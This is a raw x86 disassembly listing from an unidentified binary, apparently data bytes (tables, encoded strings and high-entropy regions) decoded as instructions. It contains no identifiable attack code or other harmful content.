  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	nop
  421a70:	inc    edx
  421a71:	add    BYTE PTR [eax+edx*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	nop
  421a78:	inc    edx
  421a79:	add    BYTE PTR [eax+edx*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],al
  421a7f:	mov    al,ds:0xa0040042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],cl
  421a87:	mov    al,ds:0xa00c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],dl
  421a8f:	mov    al,ds:0xa0140042
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],bl
  421a97:	mov    al,ds:0xa01c0042
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],al
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],al
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],cl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],cl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax],dl
  421aaf:	mov    al,0x42
  421ab1:	add    BYTE PTR [eax+esi*4],dl
  421ab4:	inc    edx
  421ab5:	add    BYTE PTR [eax],bl
  421ab7:	mov    al,0x42
  421ab9:	add    BYTE PTR [eax+esi*4],bl
  421abc:	inc    edx
  421abd:	add    BYTE PTR [eax+0x66],bh
  421ac0:	ins    BYTE PTR es:[edi],dx
  421ac1:	jp     0x421b1a
  421ac3:	jbe    0x421b0c
  421ac5:	ja     0x421b0a
  421ac7:	js     0x421b11
  421ac9:	jno    0x421b2e
  421acb:	inc    edx
  421acc:	inc    bx
  421ace:	push   ebp
  421acf:	jno    0x421b47
  421ad1:	ja     0x421b3a
  421ad3:	dec    edi
  421ad4:	dec    esp
  421ad5:	dec    ebp
  421ad6:	inc    edx
  421ad7:	jno    0x421b4a
  421ad9:	jae    0x421b2e
  421adb:	push   eax
  421adc:	arpl   WORD PTR [ebx-0x7a],dx
  421adf:	push   ds
  421ae0:	inc    edx
  421ae1:	add    BYTE PTR [esi+0x2600421e],cl
  421ae7:	sbb    eax,0xbef0042
  421aec:	mov    dl,0xe
  421aee:	jns    0x421b3e
  421af0:	xor    BYTE PTR [esi-0x79],cl
  421af3:	dec    edi
  421af4:	cmp    eax,0x3e4faf4e
  421af9:	dec    esi
  421afa:	js     0x421b4a
  421afc:	cmp    ecx,DWORD PTR [esi-0x64]
  421aff:	dec    edi
  421b00:	inc    esp
  421b01:	dec    esi
  421b02:	jae    0x421b52
  421b04:	inc    ecx
  421b05:	dec    esi
  421b06:	xor    BYTE PTR [esi+0x40],cl
  421b09:	dec    esi
  421b0a:	pop    esp
  421b0b:	pop    ebp
  421b0c:	pop    edi
  421b0d:	push   edx
  421b0e:	cmp    DWORD PTR [esi+0x79],ecx
  421b11:	dec    esi
  421b12:	xor    BYTE PTR [esi-0x79],cl
  421b15:	dec    edi
  421b16:	cmp    eax,0x3e4faf4e
  421b1b:	dec    esi
  421b1c:	js     0x421b6c
  421b1e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b21:	dec    edi
  421b22:	inc    esp
  421b23:	dec    esi
  421b24:	mov    DWORD PTR [edi+0x41],ecx
  421b27:	dec    esi
  421b28:	xor    BYTE PTR [esi+0x40],cl
  421b2b:	dec    esi
  421b2c:	pop    esp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	pop    edi
  421b2f:	bound  edi,QWORD PTR [ecx]
  421b31:	dec    esi
  421b32:	jns    0x421b82
  421b34:	xor    BYTE PTR [esi-0x80],cl
  421b37:	dec    edi
  421b38:	cmp    eax,0x394e734e
  421b3d:	dec    esi
  421b3e:	mov    ds:0x304e3a4f,al
  421b43:	dec    esi
  421b44:	inc    esi
  421b45:	dec    esi
  421b46:	pop    esp
  421b47:	jge    0x421ba8
  421b49:	jb     0x421bba
  421b4b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b4f:	xchg   ebx,eax
  421b50:	jns    0x421ae2
  421b52:	aas    
  421b53:	dec    esi
  421b54:	test   BYTE PTR [edi+0x30],cl
  421b57:	dec    esi
  421b58:	test   BYTE PTR [edi+0x3c],cl
  421b5b:	dec    esi
  421b5c:	mov    ds:0x734e394f,al
  421b61:	dec    esi
  421b62:	inc    ebp
  421b63:	dec    esi
  421b64:	xor    BYTE PTR [esi+0x44],cl
  421b67:	dec    esi
  421b68:	pop    esp
  421b69:	lea    ebx,[edi-0x7e]
  421b6c:	outs   dx,DWORD PTR ds:[esi]
  421b6d:	xchg   edx,eax
  421b6e:	outs   dx,BYTE PTR ds:[esi]
  421b6f:	xchg   ebx,eax
  421b70:	jle    0x421b15
  421b72:	jns    0x421b14
  421b74:	aas    
  421b75:	dec    esi
  421b76:	test   BYTE PTR [edi+0x30],cl
  421b79:	dec    esi
  421b7a:	test   BYTE PTR [edi+0x3c],cl
  421b7d:	dec    esi
  421b7e:	mov    ds:0x894e394f,al
  421b83:	dec    edi
  421b84:	inc    ebp
  421b85:	dec    esi
  421b86:	xor    BYTE PTR [esi+0x44],cl
  421b89:	dec    esi
  421b8a:	pop    esp
  421b8b:	popf   
  421b8c:	pop    edi
  421b8d:	xchg   edx,eax
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	mov    ds:0xb37ea36e,al
  421b94:	jns    0x421b46
  421b96:	aas    
  421b97:	dec    esi
  421b98:	mov    cs,WORD PTR [edi+0x30]
  421b9b:	dec    esi
  421b9c:	lods   al,BYTE PTR ds:[esi]
  421b9d:	dec    edi
  421b9e:	cmp    eax,0x394e734e
  421ba3:	dec    esi
  421ba4:	mov    eax,ds:0x304e3a4f
  421ba9:	dec    esi
  421baa:	inc    esp
  421bab:	dec    esi
  421bac:	pop    esp
  421bad:	lods   eax,DWORD PTR ds:[esi]
  421bae:	pop    edi
  421baf:	mov    ds:0xb36eb26f,al
  421bb4:	jle    0x421b79
  421bb6:	jns    0x421b78
  421bb8:	aas    
  421bb9:	dec    esi
  421bba:	mov    cs,WORD PTR [edi+0x30]
  421bbd:	dec    esi
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	dec    edi
  421bc0:	cmp    eax,0x394e7e4e
  421bc5:	dec    esi
  421bc6:	lahf   
  421bc7:	dec    edi
  421bc8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bcb:	dec    esi
  421bcc:	inc    ebp
  421bcd:	dec    esi
  421bce:	pop    esp
  421bcf:	mov    ebp,0xc26fb25f
  421bd4:	outs   dx,BYTE PTR ds:[esi]
  421bd5:	ret    
  421bd6:	jle    0x421bab
  421bd8:	jns    0x421baa
  421bda:	aas    
  421bdb:	dec    esi
  421bdc:	mov    cs,WORD PTR [edi+0x30]
  421bdf:	dec    esi
  421be0:	lods   al,BYTE PTR ds:[esi]
  421be1:	dec    edi
  421be2:	cmp    eax,0x394f804e
  421be7:	dec    esi
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	dec    edi
  421bea:	cmp    cl,BYTE PTR [esi+0x30]
  421bed:	dec    esi
  421bee:	inc    esi
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	int    0x5f
  421bf3:	ret    0xd26f
  421bf6:	outs   dx,BYTE PTR ds:[esi]
  421bf7:	sar    DWORD PTR [esi-0x1d],cl
  421bfa:	jns    0x421bdc
  421bfc:	aas    
  421bfd:	dec    esi
  421bfe:	mov    cs,WORD PTR [edi+0x30]
  421c01:	dec    esi
  421c02:	lods   al,BYTE PTR ds:[esi]
  421c03:	dec    edi
  421c04:	cmp    eax,0x394f834e
  421c09:	dec    esi
  421c0a:	mov    ds:0x304e3a4f,al
  421c0f:	dec    esi
  421c10:	inc    esp
  421c11:	dec    esi
  421c12:	pop    esp
  421c13:	fstp   QWORD PTR [edi-0x2e]
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	loop   0x421c87
  421c19:	jecxz  0x421c99
  421c1b:	repz jns 0x421c0e
  421c1e:	aas    
  421c1f:	dec    esi
  421c20:	lea    ecx,[edi+0x30]
  421c23:	dec    esi
  421c24:	lahf   
  421c25:	dec    edi
  421c26:	cmp    eax,0x3c4fa04e
  421c2b:	dec    esi
  421c2c:	xor    BYTE PTR [esi+0x3f],cl
  421c2f:	dec    esi
  421c30:	pop    esp
  421c31:	in     eax,dx
  421c32:	pop    edi
  421c33:	loop   0x421ca4
  421c35:	repnz outs dx,BYTE PTR ds:[esi]
  421c37:	repz jle 0x421c3d
  421c3a:	jns    0x421c3c
  421c3c:	jle    0x421c51
  421c3e:	jns    0x421c50
  421c40:	cmp    al,0x4e
  421c42:	jg     0x421c92
  421c44:	xor    BYTE PTR [esi-0x65],cl
  421c47:	dec    edi
  421c48:	xor    cl,BYTE PTR [esi-0x80]
  421c4b:	dec    edi
  421c4c:	cmp    al,0x4e
  421c4e:	lods   eax,DWORD PTR ds:[esi]
  421c4f:	dec    edi
  421c50:	cmp    ecx,DWORD PTR [esi+0x30]
  421c53:	dec    esi
  421c54:	inc    ebp
  421c55:	dec    esi
  421c56:	pop    esp
  421c57:	or     eax,0x126f025f
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	adc    edi,DWORD PTR [esi+0x23]
  421c60:	jns    0x421c82
  421c62:	aas    
  421c63:	dec    esi
  421c64:	add    BYTE PTR [eax],al
  421c66:	out    dx,al
  421c67:	sbb    al,BYTE PTR [edx+0x0]
  421c6a:	loop   0x421c88
  421c6c:	inc    edx
  421c6d:	add    dl,ch
  421c6f:	sbb    al,0x42
  421c71:	add    BYTE PTR [edx-0x1ffbde2],dl
  421c77:	sbb    eax,0x1e820042
  421c7c:	inc    edx
  421c7d:	add    dl,cl
  421c7f:	sbb    al,0x42
  421c81:	add    dh,cl
  421c83:	sbb    al,0x42
  421c85:	add    BYTE PTR [esi+0x1e],bh
  421c88:	inc    edx
  421c89:	add    BYTE PTR [edx],dh
  421c8b:	sbb    eax,0xa90d0042
  421c90:	pushf  
  421c91:	clc    
  421c92:	ss mov edx,0x1ce6f89c
  421c98:	inc    edx
  421c99:	add    BYTE PTR [esi-0x35ffbde3],dh
  421c9f:	sbb    eax,0x1dd60042
  421ca4:	inc    edx
  421ca5:	add    dh,ah
  421ca7:	sbb    eax,0x1d1e0042
  421cac:	inc    edx
  421cad:	add    dl,ch
  421caf:	sbb    al,BYTE PTR [edx+0x0]
  421cb2:	ds sbb eax,0x1d2e0042
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esi-0x49ffbde2],dl
  421cbf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cc6:	repnz sbb al,0x42
  421cc9:	add    BYTE PTR [esp+ebx*1],dl
  421ccc:	push   ss
  421ccd:	or     DWORD PTR [eax],0x7050d
  421cd3:	add    BYTE PTR [eax+0x0],al
  421cd6:	cmp    al,BYTE PTR [edx+0x3e]
  421cd9:	ds enter 0x4279,0x0
  421cde:	ins    DWORD PTR es:[edi],dx
  421cdf:	push   ebp
  421ce0:	inc    esp
  421ce1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ce7:	in     eax,dx
  421ce8:	inc    BYTE PTR [edi]
  421cea:	aas    
  421ceb:	cli    
  421cec:	mov    ds:0x421cda05,eax
  421cf1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cf7:	xchg   esi,eax
  421cf8:	pushf  
  421cf9:	clc    
  421cfa:	mov    ah,0x95
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    ebx,0xbaf89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ecx,0xb8f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	mov    edi,0xbef89c95
  421d13:	xchg   ebp,eax
  421d14:	pushf  
  421d15:	clc    
  421d16:	mov    ebp,0xa6f89c95
  421d1b:	xchg   ebp,eax
  421d1c:	pushf  
  421d1d:	clc    
  421d1e:	jmp    0x421a:0xe26003f9
  421d25:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d29:	add    BYTE PTR [ebx+0x77],dl
  421d2c:	jbe    0x421d7e
  421d2e:	mov    dh,0x85
  421d30:	pushf  
  421d31:	clc    
  421d32:	sbb    ecx,ebp
  421d34:	push   eax
  421d35:	pop    es
  421d36:	sbb    BYTE PTR [ebx],cl
  421d38:	add    BYTE PTR [eax],al
  421d3a:	ficomp WORD PTR [edx]
  421d3c:	inc    edx
  421d3d:	add    BYTE PTR [ebx],bl
  421d3f:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d72:	ins    BYTE PTR es:[edi],dx
  421d73:	inc    eax
  421d74:	inc    edx
  421d75:	add    BYTE PTR [esi+0x66f89c85],dh
  421d7b:	add    BYTE PTR [edx+0x0],ch
  421d7e:	add    BYTE PTR [si+0x0],ah
  421d82:	push   0x64006700
  421d87:	add    BYTE PTR [esi+0x0],ah
  421d8a:	push   0x0
  421d8c:	push   0x66006400
  421d91:	add    BYTE PTR [edi+0x0],ah
  421d94:	push   0x0
  421d96:	push   0x66006700
  421d9b:	add    BYTE PTR [eax+0x0],ch
  421d9e:	add    BYTE PTR [bp+0x0],ah
  421da2:	push   0x66006700
	...
  421daf:	add    BYTE PTR [eax],al
  421db1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421db7:	dec    edi
  421db8:	lahf   
  421db9:	dec    edi
  421dba:	mov    ds:0x9f4fa64f,al
  421dbf:	dec    edi
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	dec    edi
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	dec    esi
  421dc4:	bound  ecx,QWORD PTR [esi+0x30]
  421dc7:	dec    esi
  421dc8:	add    BYTE PTR [eax],al
  421dca:	cdq    
  421dcb:	dec    edi
  421dcc:	pushf  
  421dcd:	dec    edi
  421dce:	fwait
  421dcf:	dec    edi
  421dd0:	ins    DWORD PTR es:[edi],dx
  421dd1:	dec    esi
  421dd2:	bound  ecx,QWORD PTR [esi+0x30]
  421dd5:	dec    esi
  421dd6:	scas   eax,DWORD PTR es:[edi]
  421dd7:	dec    edi
  421dd8:	lods   eax,DWORD PTR ds:[esi]
  421dd9:	dec    edi
  421dda:	lahf   
  421ddb:	dec    edi
  421ddc:	mov    ds:0x624e6d4f,al
  421de1:	dec    esi
  421de2:	xor    BYTE PTR [esi+0x0],cl
  421de5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421deb:	dec    edi
  421dec:	test   eax,0xa04f934f
  421df1:	dec    edi
  421df2:	fwait
  421df3:	dec    edi
  421df4:	xor    BYTE PTR [esi+0x0],cl
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421e04:	mov    WORD PTR [ebp-0x32734274],gs
  421e0a:	mov    ebp,ds
  421e0c:	mov    ebp,gs
  421e0e:	mov    ebp,?
  421e10:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e16:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e1c:	mov    WORD PTR [edx-0x74],?
  421e1f:	jae    0x421dad
  421e21:	jo     0x421daf
  421e23:	jno    0x421db1
  421e25:	jbe    0x421db3
  421e27:	ja     0x421db5
  421e29:	je     0x421db7
  421e2b:	jne    0x421db9
  421e2d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e34:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e3a:	lods   al,BYTE PTR ds:[esi]
  421e3b:	jge    0x421df9
  421e3d:	jge    0x421ddd
  421e3f:	(bad)  
  421e40:	jns    0x421eb5
  421e42:	mov    ecx,0x7d738cb1
  421e47:	ins    DWORD PTR es:[edi],dx
  421e48:	enter  0x9fc6,0x26
  421e4c:	jb     0x421e51
  421e4e:	test   eax,0xb956bb17
  421e53:	hlt    
  421e54:	test   al,0x37
  421e56:	test   al,0x7e
  421e58:	fnstenv [ecx-0x6a]
  421e5b:	mov    cl,0x6a
  421e5d:	push   0xffffffce
  421e5f:	or     BYTE PTR [edx],bl
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	out    dx,eax
  421e63:	add    eax,0x9321d7aa
  421e68:	scas   al,BYTE PTR es:[edi]
  421e69:	adc    DWORD PTR [esi],esp
  421e6b:	jge    0x421e90
  421e6d:	fidiv  WORD PTR [edi]
  421e6f:	leave  
  421e70:	hlt    
  421e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e72:	cmp    ax,0x1fc8
  421e76:	mov    dh,cl
  421e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e79:	(bad)  
  421e7a:	and    DWORD PTR [eax],ebx
  421e7c:	and    DWORD PTR [ecx-0x18],esi
  421e7f:	(bad)  [ebx+0x7]
  421e82:	cmc    
  421e83:	enter  0x301a,0x14
  421e87:	inc    eax
  421e88:	inc    edx
  421e89:	add    BYTE PTR [ecx+0x66],dh
  421e8c:	jp     0x421efc
  421e8e:	rcr    BYTE PTR [edx+eax*2],cl
  421e91:	add    BYTE PTR [esi],dh
  421e93:	sbb    eax,0xed080042
  421e98:	adc    al,BYTE PTR [edi]
  421e9a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	push   0x49657557
  421ea7:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ead:	push   edi
  421eae:	jp     0x421f2a
  421eb0:	dec    ebp
  421eb1:	push   esi
  421eb2:	arpl   WORD PTR gs:[ecx+0x45],si
  421eb6:	dec    edx
  421eb7:	dec    esi
  421eb8:	data16 ja 0x421f09
  421ebb:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ed6:	inc    ebp
  421ed7:	push   edx
  421ed8:	jb     0x421f4e
  421eda:	inc    esi
  421edb:	je     0x421f1e
  421edd:	inc    esi
  421ede:	jae    0x421f56
  421ee0:	dec    ebx
  421ee1:	gs dec ecx
  421ee3:	dec    ebp
  421ee4:	dec    ebp
  421ee5:	pop    edx
  421ee6:	jp     0x421f42
  421ee8:	jbe    0x421f30
  421eea:	pop    ecx
  421eeb:	jo     0x421f65
  421eed:	inc    edi
  421eee:	gs ins BYTE PTR es:[edi],dx
  421ef0:	dec    esp
  421ef1:	js     0x421f5b
  421ef3:	inc    edx
  421ef4:	js     0x421f3c
  421ef6:	dec    eax
  421ef7:	inc    ebp
  421ef8:	inc    esp
  421ef9:	inc    esp
  421efa:	push   ecx
  421efb:	dec    edx
  421efc:	ins    BYTE PTR es:[edi],dx
  421efd:	dec    ebx
  421efe:	jbe    0x421f6e
  421f00:	pop    eax
  421f01:	jbe    0x421f4e
  421f03:	inc    ecx
  421f04:	fs gs jno 0x421f75
  421f08:	push   ebx
  421f09:	inc    ecx
  421f0a:	add    BYTE PTR [eax],al
  421f0c:	inc    ebx
  421f0d:	outs   dx,BYTE PTR ds:[esi]
  421f0e:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f12:	push   edx
  421f13:	push   ecx
  421f14:	push   0x74000064
  421f19:	jne    0x421f90
  421f1b:	ins    DWORD PTR es:[edi],dx
  421f1c:	push   ecx
  421f1d:	push   eax
  421f1e:	jo     0x421f9a
  421f20:	addr16 jo 0x421f79
  421f23:	pop    eax
  421f24:	add    BYTE PTR [eax],al
  421f26:	push   ecx
  421f27:	pop    ecx
  421f28:	inc    ebx
  421f29:	inc    edx
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	popa   
  421f2c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f30:	jne    0x421fa0
  421f32:	dec    ebx
  421f33:	je     0x421f98
  421f35:	bound  esp,QWORD PTR [edi+0x0]
  421f38:	jns    0x421f7f
  421f3a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f3d:	dec    ecx
  421f3e:	ja     0x421f85
  421f40:	dec    eax
  421f41:	inc    ebp
  421f42:	inc    edx
  421f43:	push   ebx
  421f44:	add    BYTE PTR [eax],al
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	inc    edi
  421f48:	dec    esi
  421f49:	outs   dx,DWORD PTR ds:[esi]
  421f4a:	pop    ecx
  421f4b:	inc    edi
  421f4c:	jb     0x421f95
  421f4e:	jns    0x421fc6
  421f50:	inc    ecx
  421f51:	pop    eax
  421f52:	dec    esp
  421f53:	add    BYTE PTR [eax+0x48],bh
  421f56:	bound  edx,QWORD PTR [ebx+0x43]
  421f59:	pop    eax
  421f5a:	outs   dx,DWORD PTR ds:[esi]
  421f5b:	push   0x4355
  421f60:	dec    esp
  421f61:	ins    BYTE PTR es:[edi],dx
  421f62:	inc    edx
  421f63:	push   0x76666a73
  421f68:	inc    edx
  421f69:	jo     0x421f6b
  421f6b:	add    BYTE PTR [eax],al
  421f6d:	add    BYTE PTR [edi+0x6d],ah
  421f70:	je     0x421fb9
  421f72:	ins    BYTE PTR es:[edi],dx
  421f73:	jae    0x421fdf
  421f75:	inc    esi
  421f76:	ins    DWORD PTR es:[edi],dx
  421f77:	je     0x421fcf
  421f79:	push   0x56584178
  421f7e:	push   ebx
  421f7f:	addr16 dec edx
  421f81:	jo     0x421ff5
  421f83:	js     0x421ff4
  421f85:	pop    eax
  421f86:	dec    ebx
  421f87:	push   esp
  421f88:	dec    esp
  421f89:	jns    0x421fd6
  421f8b:	js     0x422005
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	pop    ecx
  421f8f:	jae    0x421fff
  421f91:	push   0x43644448
  421f96:	arpl   WORD PTR [edx+0x55],sp
  421f99:	push   0x42504e67
  421f9e:	push   ebp
  421f9f:	je     0x422016
  421fa1:	addr16 dec edi
  421fa3:	dec    esp
  421fa4:	inc    edx
  421fa5:	ins    DWORD PTR es:[edi],dx
  421fa6:	inc    esi
  421fa7:	inc    esi
  421fa8:	inc    esi
  421fa9:	arpl   WORD PTR [edx+0x47],bx
  421fac:	push   ebp
  421fad:	inc    ebx
  421fae:	popa   
  421faf:	push   edx
  421fb0:	dec    esp
  421fb1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fb8:	push   ecx
  421fb9:	push   ebx
  421fba:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fc1:	dec    edx
  421fc2:	jns    0x42202d
  421fc4:	push   edx
  421fc5:	inc    ebx
  421fc6:	jo     0x42203d
  421fc8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fcc:	fs push ebx
  421fce:	inc    ebx
  421fcf:	push   ebp
  421fd0:	push   eax
  421fd1:	ja     0x42200e
  421fd3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fd7:	mov    ebp,0xa53ddffb
  421fdc:	js     0x421f97
  421fde:	aaa    
  421fdf:	inc    ecx
  421fe0:	pushf  
  421fe1:	arpl   WORD PTR [edx],sp
  421fe3:	xlat   BYTE PTR ds:[ebx]
  421fe4:	add    DWORD PTR [eax],eax
  421fe6:	arpl   WORD PTR [eax],ax
  421fe8:	add    BYTE PTR [eax],al
  421fea:	fwait
  421feb:	xchg   BYTE PTR [edx-0x7e11672a],ch
  421ff1:	call   FWORD PTR [ecx+ecx*1]
  421ff4:	mov    ah,BYTE PTR [eax+edi*2+0x0]
  421ff8:	mov    eax,ds:0x9d2e8a17
  421ffd:	hlt    
  421ffe:	mov    esp,0xac278ab6
  422003:	adc    al,0x3b
  422005:	mov    ebp,0x6c8d14dd
  42200a:	rol    DWORD PTR [edx+0x21],0x2b
  42200e:	mov    ds:0xb530d575,eax
  422013:	dec    ecx
  422014:	repz or BYTE PTR [ecx],0x52
  422018:	mov    cl,BYTE PTR [ecx]
  42201a:	pop    eax
  42201b:	out    0x15,eax
  42201d:	mov    edx,0x1808b9fe
  422022:	cwde   
  422023:	sub    BYTE PTR [edx],dl
  422025:	fcmovu st,st(2)
  422027:	cmp    DWORD PTR [esi+0x35b001fc],0xb7c69927
  422031:	mov    WORD PTR [eax-0xdf4fd5c],es
  422037:	movhps xmm4,QWORD PTR [esi-0x7e]
  42203b:	dec    esi
  42203c:	cmp    eax,0x65204b2c
  422041:	nop
  422042:	dec    eax
  422043:	cmp    BYTE PTR [edi],cl
  422045:	iret   
  422046:	rcl    DWORD PTR [ecx+0x31b601be],cl
  42204c:	sbb    eax,DWORD PTR [eax]
  42204e:	add    BYTE PTR [eax],al
  422050:	add    BYTE PTR [eax],al
  422052:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422058:	(bad)  
  422059:	cli    
  42205a:	jl     0x4220c0
  42205c:	xlat   BYTE PTR ds:[ebx]
  42205d:	push   esi
  42205e:	xlat   BYTE PTR ds:[ebx]
  42205f:	fisub  WORD PTR [esi+0x1d78516]
  422065:	add    BYTE PTR [ebx+0x0],ah
  422068:	add    BYTE PTR [eax],al
  42206a:	xchg   BYTE PTR [edx-0x13],cl
  42206d:	dec    esp
  42206e:	pop    esp
  42206f:	out    0x5e,eax
  422071:	push   edx
  422072:	gs aam 0xc3
  422075:	aam    0x59
  422077:	inc    esp
  422078:	jo     0x422065
  42207a:	sub    al,BYTE PTR [esi+0x47127578]
  422080:	into   
  422081:	stos   DWORD PTR es:[edi],eax
  422082:	out    0x99,al
  422084:	jno    0x42202c
  422086:	fisub  DWORD PTR [ebx-0x4a]
  422089:	loope  0x4220bd
  42208b:	int3   
  42208c:	dec    ebp
  42208d:	push   esi
  42208e:	xor    DWORD PTR [edi+0x2f],edi
  422091:	ds call 0x651cbb7a
  422097:	mov    dl,0x33
  422099:	ss iret 
  42209b:	in     eax,dx
  42209c:	xchg   ebx,eax
  42209d:	mul    BYTE PTR [ecx+ecx*4-0xf74c7eb]
  4220a4:	lods   al,BYTE PTR ds:[esi]
  4220a5:	and    eax,0xe33a8d6a
  4220aa:	(bad)  
  4220ab:	(bad)  
  4220ac:	sub    dl,al
  4220ae:	clc    
  4220af:	xchg   ebp,eax
  4220b0:	test   al,0x6e
  4220b2:	dec    edi
  4220b3:	adc    eax,0xdea90aef
  4220b8:	push   0x36df832b
  4220bd:	in     al,dx
  4220be:	xlat   BYTE PTR ds:[ebx]
  4220bf:	pop    ecx
  4220c0:	ins    DWORD PTR es:[edi],dx
  4220c1:	jp     0x4220e1
  4220c3:	aam    0xb2
  4220c5:	pop    es
  4220c6:	adc    BYTE PTR [edi+esi*4+0x76],bh
  4220ca:	aaa    
  4220cb:	xchg   ebp,eax
  4220cc:	ins    BYTE PTR es:[edi],dx
  4220cd:	add    BYTE PTR [eax],al
  4220cf:	add    BYTE PTR [eax],al
  4220d1:	add    BYTE PTR [ebx-0x7e80ab],dh
  4220d7:	stos   DWORD PTR es:[edi],eax
  4220d8:	push   DWORD PTR [edi-0x42]
  4220db:	xchg   esi,eax
  4220dc:	push   0x1bc0ac57
  4220e1:	xor    eax,ebp
  4220e3:	xlat   BYTE PTR ds:[ebx]
  4220e4:	add    DWORD PTR [eax],eax
  4220e6:	arpl   WORD PTR [eax],ax
  4220e8:	add    BYTE PTR [eax],al
  4220ea:	inc    ecx
  4220eb:	int    0x2e
  4220ed:	add    al,0xb6
  4220ef:	push   0x73
  4220f1:	mov    ds:0x7e2796d8,al
  4220f6:	jmp    0xa504:0x702e7290
  4220fd:	push   ebx
  4220fe:	mov    dh,0x91
  422100:	push   esp
  422101:	sar    BYTE PTR ds:0x62b12212,cl
  422107:	(bad)  
  422108:	mov    ch,0x7c
  42210a:	xchg   DWORD PTR [esi+0x47],esp
  42210d:	sub    al,0x3a
  42210f:	push   eax
  422110:	leave  
  422111:	mov    edx,0xc239f801
  422116:	mov    esp,0xd126ec6a
  42211b:	repnz sbb BYTE PTR [ecx+0x75],bh
  42211f:	inc    ebp
  422120:	div    BYTE PTR ds:0xc25b8ad0
  422126:	lods   eax,DWORD PTR ds:[esi]
  422127:	imul   ecx,edi,0xffffffbc
  42212a:	jl     0x42217f
  42212c:	xor    edx,DWORD PTR [eax+0x1f]
  42212f:	dec    ebx
  422130:	in     eax,0x16
  422132:	adc    dl,BYTE PTR [edx+ecx*4-0x27]
  422136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422137:	add    ecx,edx
  422139:	sub    al,0xeb
  42213b:	int    0xde
  42213d:	jnp    0x422186
  42213f:	xchg   BYTE PTR [edi-0x3b],ch
  422142:	das    
  422143:	in     eax,0x93
  422145:	mov    ecx,0xbcfa64de
  42214a:	pop    ss
  42214b:	(bad)  
  42214d:	add    BYTE PTR [eax],al
  42214f:	add    BYTE PTR [eax],al
  422151:	add    BYTE PTR [eax],bh
  422153:	(bad)  
  422154:	cmp    ah,BYTE PTR [esi+edi*8]
  422157:	in     al,dx
  422158:	fimul  WORD PTR ds:[edi-0x2153942b]
  42215f:	sbb    ecx,edi
  422161:	xchg   ebp,eax
  422162:	dec    ebx
  422163:	fadd   DWORD PTR [ecx]
  422165:	add    BYTE PTR [ebx+0x0],ah
  422168:	add    BYTE PTR [eax],al
  42216a:	cmp    DWORD PTR [esi-0x1bc3238b],esp
  422170:	fcmovbe st,st(0)
  422172:	lock add DWORD PTR [ebx+edx*2+0x1bb2accb],0x87626c87
  42217e:	dec    DWORD PTR [edx-0x6d60fe9d]
  422184:	daa    
  422185:	mov    ch,0x39
  422187:	ret    
  422188:	das    
  422189:	mov    ebp,0x458137b
  42218e:	add    al,0xe9
  422190:	pop    ebp
  422191:	cmp    eax,0x84f3faba
  422196:	and    ah,ch
  422198:	js     0x4221a2
  42219a:	push   ss
  42219b:	jl     0x4221a3
  42219d:	dec    ecx
  42219e:	xchg   edx,eax
